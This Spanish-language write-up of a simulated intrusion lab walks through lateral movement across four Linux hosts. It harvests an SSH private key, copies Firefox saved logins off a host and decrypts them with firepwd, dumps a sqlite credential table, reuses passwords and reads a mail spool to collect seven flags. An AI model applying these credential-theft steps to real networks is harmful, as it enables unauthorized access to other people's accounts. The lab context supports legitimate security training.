
# Linux Lateral Movement

## <mark style="color:purple;">Lab: Internal Network I</mark>

Este es un escenario simulado de intrusión. Tienes conexión directa a una red corporativa simulada. Ahora, para ir un paso más allá, se te proporcionan credenciales de usuario obtenidas mediante phishing.

```
- User: sansa
- Pass: welcome@123
```

Para medir el progreso, hay siete flags ocultas en cuatro máquinas de la red. Las contraseñas de todos los usuarios (excepto la de sansa) son muy seguras y aleatorias, por lo que los ataques de diccionario no tendrán éxito. Además, no existen vulnerabilidades en los sistemas. Por lo tanto, concéntrese en los artefactos locales de los sistemas para avanzar.

**Objetivo**: Recoger las siete banderas.

¿Cómo se resuelve esto?

* Metasploit está instalado en la instancia de Kali a la que tendrás acceso.
* Puedes usar las herramientas que quieras.

### Hosts

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.14       INE
127.0.0.1 AttackDefense-Kali
192.131.89.2    INE
192.131.89.2 INE # Nuestra máquina Kali Linux
192.131.89.3 demo1.ine.local
192.131.89.4 demo2.ine.local
192.131.89.5 demo3.ine.local
192.131.89.6 demo4.ine.local
```

Tenemos los 4 hosts objetivo, vamos a enumerarlos.

### Escaneo de red interna

```bash
┌──(root㉿INE)-[~]
└─# nmap 192.131.89.0/24

Nmap scan report for demo1.ine.local (192.131.89.3)
Host is up (0.000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:C0:83:59:03 (Unknown)

Nmap scan report for demo2.ine.local (192.131.89.4)
Host is up (0.000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:C0:83:59:04 (Unknown)

Nmap scan report for demo3.ine.local (192.131.89.5)
Host is up (0.000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
MAC Address: 02:42:C0:83:59:05 (Unknown)

Nmap scan report for demo4.ine.local (192.131.89.6)
Host is up (0.000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:C0:83:59:06 (Unknown)
```

## <mark style="color:purple;">Target 1</mark>

En el target 1 solo tenemos SSH:

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo1.ine.local                                                                                                        

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:83:59:03 (Unknown)
```

### Acceso SSH

Accedemos por SSH y obtenemos la flag 1:

```shellscript
┌──(root㉿INE)-[~]
└─# ssh sansa@demo1.ine.local                                                                                                             
sansa@demo1.ine.local's password: welcome@123
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sansa@demo1:~$ whoami
sansa
```

```bash
sansa@demo1:~$ ls -la
total 48
drwxr-xr-x 1 sansa sansa 4096 Apr 13 17:46 .
drwxr-xr-x 1 root  root  4096 Apr 24  2019 ..
drwxr-xr-x 1 sansa sansa 4096 Apr 24  2019 .bash
-rw-r--r-- 1 sansa sansa   90 Apr 24  2019 .bash_history
-rw-r--r-- 1 sansa sansa  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 sansa sansa 3771 Apr 24  2019 .bashrc
drwx------ 2 sansa sansa 4096 Apr 13 17:46 .cache
-rw-r--r-- 1 sansa sansa  655 Apr 24  2019 .profile
drwxr-xr-x 1 sansa sansa 4096 Apr 24  2019 .ssh
-rw-r--r-- 1 sansa sansa   40 Apr 24  2019 flag.txt
-rw-r--r-- 1 sansa sansa 1679 Dec 14  2018 id_rsa
```

### Flag 1

```bash
sansa@demo1:~$ cat flag.txt 
Flag1: 0f558e86f6fcd0827ad7e428********
```

Vemos que tenemos también un `id_rsa` que guardaremos en local:

```bash
sansa@demo1:~$ cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3JH1zC1WJuJ2KCPf1UdJe1dX+Uh4aE9RKsnuQk124eOB601/
8+Q6uJej38goVYQ7Dc4INK9Pq9cOs+uDQfRdjS1/9S7a0bDVORR6Q/E3dya0RDsz
LcaqX6LkPgnBZ2gS37E4mX6kiwEvYeqaAGyFqyfn+QPLos/Znc3EA4A71LPFg01b
AmpI6Gbaa7UUG+MCZoM0qDNo5Mzr5bmtCnVOKQ6n0Qx7znu5A2p00TfzmAo7erZ8
6xJUfXQoVFzqmINqhZKFZtjgV5nk/qHgn1BPyd6NoWeXADdIJKi7iq4jomT+Ny+/
HlxrAs1IJhxtrSExSMTkqmH/3KeX9ibBWXzY1QIDAQABAoIBAEO0liOvgvN6rlRR
9sJMGJVA0WNWyIcUWdDtnTJC/wwFvvqQlocx9oh1G7t0gFUHuuzY4pHxgl44LG40
C91x+kl8vvtu/4JAaqMT0xgJ8kGj4s/S8DnL8r5ajP8yFWj9fFWn27zaL/3vRjEj
R1R7+2f3XvCEJrz6Wk1jPRjqAvOeDRGH3ojsQwWO7k/FcvtqVBCPTGxyUBzXYv06
fM3OY5NL8D7t/bLoHa8dVhqjPnfUR7/IpiAdxEam1X0ObPB5YyBwSlpj6h904bF/
+U697IE23xjVmKMKcvTLe6QAxuRGSMf3/k3rCpDd3UxYF+P2e0CK3MefWjKpAe8r
2xRXyB0CgYEA+7zgmuhJqjik8tbt6b6+ZAJZ68TqLE1f3YEW/LivMeMj5tQZo/w+
0ZJnr6hR3eicMMxWKufGXSEtbs1TzMGvA5SXI9MTu62a5A2h7NDbLuKRwdjh9Qv6
TocFSMTSFcS4jvmbeYlVaSZWrJLLKY6lsjgdjDB4DH7Uc0Anxdr//GsCgYEA4E39
rlB7GWoCX7oXpSEGCHkQkmgX5IDU7+UUySFqD8fWoLsAc47R/TmDsKI+x83PF5jG
oo5P5LmUIeqnAKknTSyfD1YFtMa3tpTE68R9j/uueTK7v5izwWQjicmILm4RdkZJ
TVVH2b0aIQaUnpWWwHLa+BYx2jH4S2GxH89vz78CgYEA211SyApFLw0fR/Hc7kRm
OlYGL7qvaR2fvTDhbCYvnKRXQ61uDoUf5JXUvrBJbrtlZ+yX5dmE9OCVa6mHLbVV
oiQYtIIZ/wCgKbxrbybs6OVMqIQrGtNuMoHcK/Y/L/L19Lk0L2tqPy/GdamRWkxQ
vYXC0cfmxNS8oxWz0uktCrMCgYB6ufF9OMfBxgD6g4WAciss46CvmojIG71mbL8M
tV2kuMC0PN0oXRKELL3jHUKga/lNfefg9WC9UtS8IfmyINtCHJIDABwrJzdJjOiZ
326cIyb5ZUrYsCJaRAI117DNRqgDQL3GtEyV1CPBwin7Avny3mT0rKAmNIUYKaGS
OBuDXQKBgQDIRYOZEaV8rXx3wN24NYuByNUpRM3AIyPIwAuaPklWD6D2KdDveheI
lZtRb6Yzzmeon0DuLPdl7e/R7e5Z8Mx3o40aiJLULlw95JqON3J3W471PZAG1L/g
59PKgUMBNVX9UsUqvHyWlcY/FAT9UhWblgDoN3uXY9Db6q5x7hWzKw==
-----END RSA PRIVATE KEY-----
```

Y en el bash history encontramos un comando para utilizarlo directamente:

```bash
sansa@demo1:~$ cat .bash_history 
ls
pwd
date
ps
unzip download.zip
ssh -i id_rsa kate@machine-2
```

Pero antes le debemos dar los permisos adecuados:

```bash
sansa@demo1:~$ chmod 600 id_rsa 
```

## <mark style="color:purple;">Target 2</mark>

Accedemos con el `id_rsa` sin contraseña como Kate:

```bash
sansa@demo1:~$ ssh -i id_rsa kate@demo2.ine.local
Welcome to Machine 2 !!
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

kate@demo2:~$ whoami
kate
```

### Flag 3

En este Host encontramos la flag 3:

```bash
kate@demo2:~$ ls
flag.txt  tools
kate@demo2:~$ cat flag.txt 
Flag3: 0f558e86f6fcd0827dc7e4286bd5bbee
```

También vemos que hay un directorio oculto `.mozilla` interesante:

```bash
kate@demo2:~$ ls -la
total 32
drwxr-xr-x 1 kate kate 4096 Apr 13 17:52 .
drwxr-xr-x 1 root root 4096 May  2  2019 ..
drwx------ 2 kate kate 4096 Apr 13 17:52 .cache
drwxr-xr-x 1 kate kate 4096 Jun  5  2019 .mozilla
drwxr-xr-x 1 kate kate 4096 May  2  2019 .ssh
-rw-r--r-- 1 kate kate   40 Apr 24  2019 flag.txt
drwxr-xr-x 1 kate kate 4096 May  2  2019 tools
```

Y dentro de ese directorio, dentro del directorio `sj1c9rus.default` nos encontramos un archivo de base de datos `key4.db` y un `logins.json` interesante:

```bash
kate@demo2:~/.mozilla/firefox/sj1c9rus.default$ ls -la
total 12244
drwxr-xr-x 1 kate kate    4096 Jun  5  2019 .
drwxr-xr-x 1 kate kate    4096 Jun  5  2019 ..
-rw-r--r-- 1 kate kate       0 Jun  5  2019 .parentlock
-rw-r--r-- 1 kate kate       0 Jun  5  2019 AlternateServices.txt
-rw-r--r-- 1 kate kate       0 Jun  5  2019 SecurityPreloadState.txt
-rw-r--r-- 1 kate kate     707 Jun  5  2019 SiteSecurityServiceState.txt
-rw-r--r-- 1 kate kate       0 Jun  5  2019 TRRBlacklist.txt
<----SNIP---->
-rw-r--r-- 1 kate kate  294912 May 14  2019 key4.db
-rw-r--r-- 1 kate kate     573 Jun  5  2019 logins.json
```

#### Descarga de archivos con SCP

```bash
┌──(root㉿INE)-[~]
└─# scp -i id_rsa kate@demo2.ine.local:~/.mozilla/firefox/sj1c9rus.default/key4.db ./                                                     
Welcome to Machine 2 !!
key4.db 
```

```bash
┌──(root㉿INE)-[~]
└─# scp -i id_rsa kate@demo2.ine.local:~/.mozilla/firefox/sj1c9rus.default/logins.json ./                                              
Welcome to Machine 2 !!
logins.json 
```

### Firepwd

Es una herramienta para extraer contraseñas de Firefox, la tenemos en la siguiente ruta:

```bash
┌──(root㉿INE)-[~/Desktop/tools]
└─# ls -la                                                                                                                                
total 60
drwxr-xr-x 1 root root 4096 Jul  3  2024 .
drwxr-xr-x 1 root root 4096 Jun 26  2024 ..
drwxr-xr-x 3 root root 4096 Jun 26  2024 AWSBucketDump
drwxr-xr-x 2 root root 4096 Jun 18  2024 Delorean
drwxr-xr-x 1 root root 4096 Feb  4  2025 firepwd
<---SNIP--->
```

Y extraemos las contraseñas con el siguiente comando:

```bash
┌──(root㉿INE)-[~/Desktop/tools/firepwd]
└─# python3 firepwd.py -d /root/

<---SNIP--->

entrySalt: b'f59a409c7659aa05ea567bc657108ea15cdd908a'
b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'ebeb5c1ab3834aea37db614d1f56e71882ff17f1'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'f105069a3ce9129a0c1f4ef3189f0d4439a7b4d7c9c0f384acdc2daf78a5b919'
 }
entrySalt: b'ebeb5c1ab3834aea37db614d1f56e71882ff17f1'
b'4a31e0b30e3894e9e0a10d58732cea2cae4938976b58dc150808080808080808'
decrypting login/password pairs
https://www.facebook.com:b'bran',b'ce001480'
```

Obtenemos la contraseña del usuario bran: `ce001480`. Este usuario parece de la tercera máquina, ya que no está presente en la 1 ni en la 2.

En la home de Kate vemos que hay otro usuario `bronn` y un archivo `database.sqlite`:

```
kate@demo2:~$ cd /home/
kate@demo2:/home$ ls
bronn  database.sqlite  kate
```

### Enumeración de SQL

```sql
kate@demo2:/home$ sqlite3 database.sqlite 

SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite> .tables
Users
sqlite> select * from users;
Machine 2|f39b963057119|0
Machine 4|9f39b96305711|0
Machine 2|9f39b96305711|1
Machine 3|963057119f39b|0
```

Obtenemos lo que pueden ser hashes o contraseñas de distintos usuarios.

### Cambiamos al usuario bronn

```bash
kate@demo2:/home$ su bronn
Password: 9f39b96305711
bronn@demo2:/home$ whoami
bronn
```

### Flag 4

```bash
bronn@demo2:/home$ cd bronn/
bronn@demo2:~$ ls
flag.txt
bronn@demo2:~$ cat flag.txt 
Flag4: e14f063e22b83fda17710cb1********
```

## <mark style="color:purple;">Target 3</mark>

En el target 3 tenemos FTP y SSH:

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo3.ine.local                                                                                                        

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:83:59:05 (Unknown)
```

Antes ya encontramos las credenciales del usuario bran, por lo que las probaremos en esta máquina:

```bash
┌──(root㉿INE)-[~]
└─# ssh bran@demo3.ine.local
bran@demo3.ine.local's password: ce001480

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

bran@demo3:~$ whoami
bran
```

### Flag 5

```bash
bran@demo3:~$ ls
flag.txt
bran@demo3:~$ cat flag.txt 
Flag5: 0f558e86f55550827ad7e428********
```

### Enumeración

En la home encontramos 7 usuarios, entre ellos algunos como sansa, kate o bronn que ya tenemos las credenciales:

```bash
bran@demo3:/home$ ls
bran  bronn  dany  john  kate  robert  sansa
```

Hay 2 nuevos usuarios que no hemos comprometido aún: dany y robert.

En la home de dany encontramos un archivo con credenciales:

```bash
bran@demo3:/home$ ls -la dany/
total 28
drwxr-xr-x 1 dany dany 4096 May  2  2019 .
drwxr-xr-x 1 root root 4096 Apr 24  2019 ..
-rw-r--r-- 1 dany dany  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 dany dany 3771 Apr 24  2019 .bashrc
-rw-r--r-- 1 dany dany  655 Apr 24  2019 .profile
-rw-r--r-- 1 root root   12 May  2  2019 credentials.txt
```

```bash
bran@demo3:/home/dany$ cat credentials.txt 
ce16384290b
```

### Acceso FTP

Tenemos acceso FTP, pero solo hay un archivo de credenciales con la contraseña de dany que ya tenemos

```bash
┌──(root㉿INE)-[~]
└─# ftp dany@demo3.ine.local                 
                                                                                             
Connected to demo3.ine.local.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.131.89.5]
331 Password required for dany
Password: ce16384290b
+230 User dany logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||63468|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              12 May  2  2019 credentials.txt
226 Transfer complete
ftp> get credentials.txt
```

### Password Reuse

Con la contraseña de dany también conseguimos loguearnos por SSH en el target 1, y obtenemos la flag 2 que nos faltaba:

```bash
┌──(root㉿INE)-[~]
└─# ssh dany@demo1.ine.local                                                                                                              
dany@demo1.ine.local's password: ce16384290b
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dany@demo1:~$ whoami
dany
```

### Flag 2

```bash
dany@demo1:~$ ls
flag.txt
dany@demo1:~$ cat flag.txt 
Flag2: f0af063e22b83fda17710cb18efb591b
```

## <mark style="color:purple;">Target 4</mark>

En el target 4 solo tenemos SSH:

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo4.ine.local                                                                                                        

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:83:59:03 (Unknown)
```

Antes nos encontramos las siguientes credenciales, entre ellas había una para el target 4:

```bash
Machine 2|f39b963057119|0
Machine 4|9f39b96305711|0
Machine 2|9f39b96305711|1
Machine 3|963057119f39b|0
```

### Conexión SSH

Podríamos hacer fuerza bruta con una lista de usuarios y contraseñas recopiladas, pero probando con el usuario `bronn` y la contraseña del target 4 conseguimos acceder:

```bash
┌──(root㉿INE)-[~]
└─# ssh bronn@demo4.ine.local                                                                                                          
bronn@demo4.ine.local's password: 9f39b96305711

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

You have mail.
bronn@demo4:~$ whoami
bronn
```

### Flag 6

```bash
bronn@demo4:~$ ls
flag.txt
bronn@demo4:~$ cat flag.txt 
Flag6: 4050f55886f6cd0827d7e428********
```

### Enumeración

En el directorio home encontramos otro usuario robert, donde está la última flag pero no podemos acceder directamente:

```bash
bronn@demo4:/home$ ls
bronn  robert

bronn@demo4:/home$ ls -la robert/
total 28
drwxr-xr-x 1 robert robert 4096 Apr 24  2019 .
drwxr-xr-x 1 root   root   4096 Apr 24  2019 ..
-rw-r--r-- 1 robert robert  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 robert robert 3771 Apr 24  2019 .bashrc
-rw-r--r-- 1 robert robert  655 Apr 24  2019 .profile
-r-x------ 1 robert robert   40 Apr 24  2019 flag.txt

bronn@demo4:/home$ cd robert/
bronn@demo4:/home/robert$ cat flag.txt 
cat: flag.txt: Permission denied
```

### Variables de entorno

Observamos que hay varias variables de entorno (env) que puden almacenar credenciales:

```bash
bronn@demo4:~$ env

TERM=xterm-256color
SHELL=/bin/bash
SSH_CLIENT=192.131.89.2 47264 22
SSH_TTY=/dev/pts/0
USER=bronn
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
MAIL=/var/mail/bronn
<---SNIP--->
```

Viendo la variable de entorno MAIL obtenemos la contraseña de robert de un email:

```bash
bronn@demo4:~$ cat /var/mail/bronn 

From root@localhost  Tue Nov 28 16:21:49 2018
Return-Path: <root@localhost>
X-Original-To: bronn@localhost
Delivered-To: bronn@localhost
Received: from localhost (unknown [127.0.0.1])
        by localhost (Postfix) with SMTP id C776713EA0CB
        for <bronn@localhost>; Tue, 28 Nov 2018 16:21:23 +0000 (UTC)
Subject: Another user account for you !!

Hi bronn,

Here are the credentials for your additional user account:

Username: robert
Password: 449d4b2ce

Thanks!
```

### Flag 7

```bash
bronn@demo4:~$ su robert
Password: 449d4b2ce
robert@demo4:/home/bronn$ cd /home/robert/
robert@demo4:~$ ls
flag.txt
robert@demo4:~$ cat flag.txt 
Flag7: f0af063e22b8377777710cb1********
```
